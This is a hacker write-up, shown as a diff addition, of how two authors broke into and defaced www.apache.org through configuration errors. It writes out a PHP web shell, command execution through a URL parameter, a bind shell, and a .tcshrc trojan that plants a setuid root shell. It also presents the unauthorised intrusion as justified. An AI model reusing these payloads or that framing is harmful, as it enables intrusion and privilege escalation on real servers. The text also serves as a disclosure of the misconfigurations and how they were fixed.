@@ -1,0 +1,187 @@
+               How we defaced www.apache.org
+                    by {} and Hardbeat
+
+/*
+ * Before you start reading
+ */
+This paper does _not_ uncover any new vulnerabilities. It points out common
+(and slightly less common) configuration errors, which even the people at
+apache.org made. This is a general warning. Learn from it. Fix your systems,
+so we won't have to :)
+
+/*
+ * introduction
+ */
+This paper describes how, over the course of a week, we succeeded in
+getting root access to the machine running www.apache.org, and changed
+the main page to show a 'Powered by Microsoft BackOffice' logo instead
+of the default 'Powered by Apache' logo (the feather). No other changes
+were made, except to prevent other (possibly malicious) people getting in.
+
+Note that the problems described in this paper are not apache-related,
+these were all config errors (one of 'm straight from BugZilla's README,
+but the README had enough warnings so I don't blame the BugZilla developers).
+People running apache httpd do not need to start worrying because of
+anything uncovered herein.
+
+We hacked www.apache.org because there are a lot of servers running apache
+software and if www.apache.org got compromised, somebody could backdoor
+the apache server source and end up having lots of owned boxes.
+
+We just couldn't allow this to happen, we secured the main ftproot==wwwroot
+thing. While having owned root we just couldnt stand the urge to put that
+small logo on it.
+
+/*
+ * ftproot == wwwroot
+ * o+w dirs
+ */
+While searching for the laters apache httpserver to diff it the with
+previous version and read that diff file for any options of new buffer
+overflows, we got ourselves to ftp://ftp.apache.org. We found a mapping of
+the http://www.apache.org on that ftp including world writable directories.
+
+So we wrote a little wuh.php3 including 
+<?
+        passthru($cmd);
+?>
+
+and uploaded that to one of the world writable directories.
+
+
+/*
+ * Our commands executed
+ */
+Unsurprisingly, 'id' got executed when called like
+
+      http://www.apache.org/thatdir/wuh.php3?cmd=id
+
+Next was to upload some bindshell and compile it like calling
+http://www.apache.org/thatdir/wuh.php3?cmd=gcc+-o+httpd+httpd.c and then
+executing it like calling http://www.apache.org/thatdir/wuh.php3?cmd=./httpd
+
+
+/*
+ * The shell
+ */
+Ofcourse we used a bindshell that first requires ppl to authenticate with
+a hardcoded password (:
+
+Now we telnet to port 65533 where we binded that shell and we have local
+nobody access, because cgi is running as user nobody. 
+
+
+/*
+ * The apache.org box
+ */
+What did we find on apache.org box:
+        -o=rx /root
+        -o=rx homedirs
+        
+apache.org is a freebsd 3.4 box. We didn't wanted to use any buffer
+overflow or some lame exploit, goal was to reach root with only
+configuration faults. 
+
+
+/*
+ * Mysql
+ */
+After a long search we found out that mysql was
+running as user root and was reachable locally. Because apache.org was
+running bugzilla which requires a mysql account and has it
+username/password plaintext in the bugzilla source it was easy to
+get a username/passwd for the mysql database.
+
+We downloaded nportredird and have it set up to accept connections on
+port 23306 from our ips and redir them to localhost port 3306 so we could
+use our own mysql clients.
+
+
+/*
+ * Full mysql access
+ * use it to create files
+ */
+Having gained access to port 3306 coming from localhost, using the login
+'bugs' (which had full access [as in "all Y's"]), our privs where
+elevated substantially. This was mostly due to sloppy reading of the BugZilla
+README which _does_ show a quick way to set things up (with all Y's) but
+also has lots of security warnings, including "don't run mysqld as root".
+
+Using 'SELECT ... INTO OUTFILE;' we were now able to create files
+anywhere, as root. These files were mode 666, and we could not overwrite
+anything. Still, this seemed useful.
+
+But what do you do with this ability? No use writing .rhosts files - no
+sane rshd will accept a world-writable .rhosts file. Besides, rshd
+wasn't running on this box.
+
+
+/*
+ * our /root/.tcshrc
+ */
+Therefore, we decided to perform a trojan-like trick. We used database
+'test' and created a one-column table with a 80char textfield. A couple
+of inserts and one select later, we had ourselves a /root/.tcshrc with
+contents similar to:
+      #!/bin/sh
+      cp /bin/sh /tmp/.rootsh
+      chmod 4755 /tmp/.rootsh
+      rm -f /root/.tcshrc
+
+      
+/*
+ * ROOT!!
+ */
+Quite trivial. Now the wait was for somebody to su -. Luckily, with 9
+people legally having root, this didn't take long. The rest is trivial
+too - being root the deface was quickly done, but not until after a
+short report listing the vulnerabilities and quick fixes was build.
+Shortly after the deface, we sent this report to one of the admins.
+
+
+/*
+ * Fix that ftproot==wwwroot
+ */
+Another thing we did before the deface, was creating a file 'ftproot' in
+the wwwroot (which was also ftproot), moving 'dist' to 'ftproot/dist'
+and changing the ftproot to this new 'ftproot' dir, yielding the
+world-writable dirs unexploitable but allowing ftp URLs to continue
+working.
+
+
+/*
+ * What could have been compromised?
+ */
+Remember the trojaned tcp_wrappers on ftp.win.tue.nl last year? If we
+wanted to, we could have done the same thing to Apache. Edit the source
+and have people download trojaned versions. Scary, eh?
+
+
+/*
+ * In short:
+ */
+- ftproot==webroot, worldwritable dirs allowing us to upload and execute
+  php3 scripts
+- mysqld running as root, with a FULL RIGHTS login without a password.
+
+
+/*
+ * Compliments for the Apache admin team
+ */
+We would like to compliment the Apache admin team on their swift
+response when they found out about the deface, and also on their
+approach, even calling us 'white hats' (we were at the most 'grey hats'
+here, if you ask us).
+
+
+                                      Regards,
+                                         {} and Hardbeat.
+
+          {} (mailto:karin@root66.nl.eu.org) is part of
+     RooT66 - http://root66.nl.eu.org
+ShellOracle - http://www.shelloracle.cjb.net
+        b0f - http://b0f.freebsd.lublin.pl
+                                         
+    Hardbeat (petervd@vuurwerk.nl) just has a lame page at
+        http://www.dataloss.net/
+
